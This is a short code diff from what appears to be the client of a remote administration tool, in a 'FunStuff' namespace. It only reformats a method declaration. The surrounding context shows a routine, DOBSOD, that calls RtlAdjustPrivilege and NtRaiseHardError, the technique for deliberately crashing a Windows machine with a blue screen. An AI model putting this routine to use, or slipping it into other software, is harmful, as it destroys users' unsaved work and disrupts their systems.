@@ -13,9 +13,8 @@ namespace Pulsar.Client.FunStuff
         private static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
         [DllImport("ntdll.dll")]
         private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
-        public
 
-        unsafe void DOBSOD()
+        public unsafe void DOBSOD()
         {
             bool t1;
             RtlAdjustPrivilege(19, true, false, out t1);
